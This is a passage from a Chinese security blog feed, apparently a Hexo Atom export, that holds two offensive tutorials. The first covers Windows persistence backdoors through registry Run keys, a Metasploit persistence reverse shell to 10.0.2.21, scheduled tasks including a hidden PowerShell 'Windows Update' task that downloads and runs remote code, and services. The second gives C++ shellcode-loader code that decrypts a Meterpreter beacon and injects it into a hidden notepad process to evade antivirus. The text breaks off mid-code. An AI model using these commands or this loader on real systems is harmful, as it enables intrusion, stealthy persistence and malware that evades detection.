class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure><p>该注册表操作语句会在目标主机的启动项里增加一个命名。当目标主机登录系统时，后门就会运行。</p><h3 id="2-利用本地计算机的注册表位置"><a href="#2-利用本地计算机的注册表位置" class="headerlink" title="2.利用本地计算机的注册表位置"></a>2.利用本地计算机的注册表位置</h3><p>​    如果攻击者所获得的权限提升了，则最好使用本地计算机注册表的位置，而不是以上的<code>CURRENT_USER</code>的键，因为有效负载将在每次系统启动时执行，而与使用系统身份验证的用户无关，这样就可以实现所有用户的持久化。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure><h3 id="3-LOCAL-CHINE键的特殊位置"><a href="#3-LOCAL-CHINE键的特殊位置" class="headerlink" title="3.LOCAL_CHINE键的特殊位置"></a>3.LOCAL_CHINE键的特殊位置</h3><p>还有两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登录期间执行，<strong>并且需要管理员级别的特权</strong>。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001<span class="hljs-symbol">\D</span>epend&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.dll&quot;<br></code></pre></td></tr></table></figure><h3 id="4-MSF也有相关-的模块可以使用"><a href="#4-MSF也有相关-的模块可以使用" class="headerlink" title="4.MSF也有相关 的模块可以使用"></a>4.MSF也有相关 的模块可以使用</h3><p>​    <code>Metasploit Framework</code>通过使用<code>Meterpreter</code>脚本和后期利用模块来支持通过注册表的持久性。<code>Meterpreter</code>脚本将以<code>VBS</code>脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该有效负载。</p><p>​    当我们拿到Meterpreter会话的时候，我们可以直接利用Meterpreter的一个模块<code>persistence</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -U -P windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp -i <span class="hljs-number">5</span> -p <span class="hljs-number">443</span> -r <span class="hljs-number">10.0.2.21</span><br></code></pre></td></tr></table></figure><p>​    （<strong>非常推荐用该方法，因为用该方法就可以使用自己免杀的程序了</strong>）MSF还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/manage/persistence_exe<br><span class="hljs-builtin-name">set</span> REXEPATH /tmp/pentestlab.exe<br><span class="hljs-builtin-name">set</span> SESSION 2<br><span class="hljs-builtin-name">set</span> STARTUP USER<br><span class="hljs-builtin-name">set</span> LOCALEXEPATH C:\\tmp<br>run<br></code></pre></td></tr></table></figure><h2 id="3-计划任务后门"><a href="#3-计划任务后门" class="headerlink" title="3.计划任务后门"></a>3.计划任务后门</h2><p>​    计划任务后门分为管理员权限和普通用户权限两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行等。</p><h3 id="1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）"><a href="#1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）" class="headerlink" title="1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）"></a>1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）</h3><p>每天<code>22：26</code>时都执行<code>cmd.exe</code>可执行文件。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/9.png"></p><h3 id="2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）"><a href="#2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）" class="headerlink" title="2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）"></a>2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）</h3><p>​    该命令表示每一个小时执行<code>notepad.exe</code>。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> UPDATER <span class="hljs-string">/TR</span> C:\Windows\System32\notepad.exe <span class="hljs-string">/SC</span> HOURLY <span class="hljs-string">/MO</span> 1<br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/10.png"></p><p>​    如果用MSF或者Empire其它工具来建立计划任务进行反弹shell等恶意操作的话，现在已经常常受到安全防护软件的查杀了。</p><p>​    因此想利用好该方法，还得使用免杀技术。</p><p>​    免杀程序可以看看我的一些免杀的文章。</p><h4 id="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"><a href="#设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。" class="headerlink" title="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"></a>设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#(X64) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;你要执行的命令或文件&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X64) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br><br><span class="hljs-comment">#(X86) - On User Login</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onlogon <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br></code></pre></td></tr></table></figure><h4 id="设定在特定时间发生"><a href="#设定在特定时间发生" class="headerlink" title="设定在特定时间发生"></a>设定在特定时间发生</h4><p>效负载的执行也可以在特定的时间发生，并且可以具有到期日期和自删除功能。“schtasks”实用程序提供了必要的选项，因为它是其功能的一部分。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;Windows Update&quot;</span> <span class="hljs-string">/TR</span> <span class="hljs-string">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/REEEE&#x27;&#x27;&#x27;))&#x27;&quot;</span> <span class="hljs-string">/SC</span> minute <span class="hljs-string">/MO</span> 1 <span class="hljs-string">/ED</span> 04/11/2019 <span class="hljs-string">/ET</span> 06<span class="hljs-function">:53</span> <span class="hljs-string">/Z</span> <span class="hljs-string">/IT</span> <span class="hljs-string">/RU</span> %USERNAME%<br><br></code></pre></td></tr></table></figure><h3 id="3-使用PowerShell创建定时任务"><a href="#3-使用PowerShell创建定时任务" class="headerlink" title="3.使用PowerShell创建定时任务"></a>3.使用PowerShell创建定时任务</h3><p>可以使用PowerShell创建计划任务，这些任务将在用户登录时或在特定时间和日期执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-AtLogOn</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;pentestlab&quot;</span><br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$P</span> = <span class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;Pentestlab&quot;</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> Pentestlab <span class="hljs-literal">-InputObjec</span> <span class="hljs-variable">$D</span><br><br><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-Daily</span> <span class="hljs-literal">-At</span> <span class="hljs-number">9</span>am<br><span class="hljs-variable">$P</span> = <span class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="hljs-literal">-RunLevel</span> Highest<br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> PentestLaboratories <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$D</span><br></code></pre></td></tr></table></figure><h2 id="4-服务后门"><a href="#4-服务后门" class="headerlink" title="4.服务后门"></a>4.服务后门</h2><p>​    如果未正确配置Windows环境中的服务或这些服务可以用作持久性方法，则这些服务可能导致权限提升。创建一个新的服务需要管理员级别的特权，它已经不是隐蔽的持久性技术。然而，在红队的行动中，针对那些在威胁检测方面还不成熟的公司，可以用来制造进一步的干扰，企业应建立SOC能力，以识别在其恶意软件中使用基本技术的威胁。</p><h3 id="1-命令行创建服务"><a href="#1-命令行创建服务" class="headerlink" title="1.命令行创建服务"></a>1.命令行创建服务</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">sc create pentestlab <span class="hljs-attr">binpath=</span> <span class="hljs-string">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span> <span class="hljs-attr">start=</span> <span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">obj=</span> <span class="hljs-string">&quot;LocalSystem&quot;</span><br></code></pre></td></tr></table></figure><p>注意：等号和值之间需要有空格，否则会创建失败</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/11.png"></p><p>删除的话，用如下命令就可以了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">sc</span> <span class="hljs-variable">delete</span> <span class="hljs-function"><span class="hljs-title">pentestlab</span>(服务名)</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/12.png"></p><h3 id="2-使用Powershell"><a href="#2-使用Powershell" class="headerlink" title="2.使用Powershell"></a>2.使用Powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;pentestlab&quot;</span> <span class="hljs-literal">-BinaryPathName</span> <span class="hljs-string">&quot;C:\temp\pentestlab.exe&quot;</span> <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;PentestLaboratories&quot;</span> <span class="hljs-literal">-StartupType</span> Automatic<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> pentestlab<br></code></pre></td></tr></table></figure><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/13.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;后门（backdoor），在信息安全领域通常是指绕过安全措施获取对程序或系统访问权限的方法。攻击者往往在提升权之后，会通过建</summary>
      
    
    
    
    <category term="内网安全" scheme="https://reader-l.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>简单加密+分离+进程注入绕过杀软</title>
    <link href="https://reader-l.github.io/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://reader-l.github.io/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2021-04-11T03:55:35.000Z</published>
    <updated>2021-04-26T03:04:23.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    这篇文章涉及到分离配合加密免杀的原理：就是将<code>shellcode</code>进行加密的同时和<code>shellcode</code>加载器进行分离，但这里需要注意的是这里的<code>shellcode</code>是指完整的<code>beacon</code>，而不是<code>stager</code>，我们是需要对完整的<code>beacon</code>进行加密。</p><p>​    比如用MSF生成的<code>reverse_tcp</code>这一类型的<code>payload</code>的<code>shellcode</code>。我们需要用的是这个payload：<code>windows/x64/meterpreter_reverse_tcp</code>（这种是完整的beacon）并对其进行加密，而不是<code>windows/x64/meterpreter/reverse_tcp</code>（这一种生成的是<code>stager</code>，在目标服务器执行的时候，它会向攻击者的msf服务请求完整的<code>beacon</code>再完成反弹。）对这payload的生成的<code>shellcode</code>进行加密，其实你只是加密了<code>stager</code>而不是<code>beacon</code>，所以你的<code>beacon</code>还是明文的，容易被查杀。</p><h1 id="2-使用到的windows-api"><a href="#2-使用到的windows-api" class="headerlink" title="2.使用到的windows api"></a>2.使用到的windows api</h1><h2 id="1-分离基础"><a href="#1-分离基础" class="headerlink" title="1.分离基础"></a>1.分离基础</h2><h3 id="1-CreateFile"><a href="#1-CreateFile" class="headerlink" title="1.CreateFile"></a>1.CreateFile</h3><p>该方法用于打开文件，我是利用它打开MSF生成的文件<code>beacon</code>。</p><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.png"></p><h3 id="2-GetFileSize"><a href="#2-GetFileSize" class="headerlink" title="2.GetFileSize"></a>2.GetFileSize</h3><p>获取字节文件的大小。</p><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.png"></p><h3 id="3-ReadFile"><a href="#3-ReadFile" class="headerlink" title="3.ReadFile"></a>3.ReadFile</h3><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.png"></p><h2 id="2-进程注入基础"><a href="#2-进程注入基础" class="headerlink" title="2.进程注入基础"></a>2.进程注入基础</h2><h3 id="1-进程创建"><a href="#1-进程创建" class="headerlink" title="1.进程创建"></a>1.进程创建</h3><h4 id="1-CreateProcessA"><a href="#1-CreateProcessA" class="headerlink" title="1.CreateProcessA"></a>1.CreateProcessA</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.png"></p><h3 id="2-进程注入"><a href="#2-进程注入" class="headerlink" title="2.进程注入"></a>2.进程注入</h3><h4 id="1-WriteProcessMemory"><a href="#1-WriteProcessMemory" class="headerlink" title="1.WriteProcessMemory"></a>1.WriteProcessMemory</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.png"></p><h4 id="2-CreateRemoteThread"><a href="#2-CreateRemoteThread" class="headerlink" title="2.CreateRemoteThread"></a>2.CreateRemoteThread</h4><p><img src="/2021/04/11/%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86-%E5%88%86%E7%A6%BB-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/6.png"></p><h1 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h1><h3 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc,_TCHAR* argv[])<br>&#123;<br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//key</span><br><span class="hljs-keyword">int</span> key = <span class="hljs-number">100000</span>;<br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>ReadFile(hFile, shellcode, shellcode_size, &amp;dwread, <span class="hljs-literal">NULL</span>);<br><br>StreamCrypt((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)shellcode, shellcode_size, key); <span class="hljs-comment">// decode</span><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>LPVOID allocation_start;<br>SIZE_T allocation_size = (SIZE_T)shellcode_size;<br>HANDLE hProcess, hThread;<br><br><br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>,<span class="hljs-literal">NULL</span> , <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//Execute the process</span><br>allocation_start = VirtualAllocEx(pi.hProcess, <span class="hljs-literal">NULL</span>, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>WriteProcessMemory(pi.hProcess, allocation_start,shellcode, allocation_size, <span 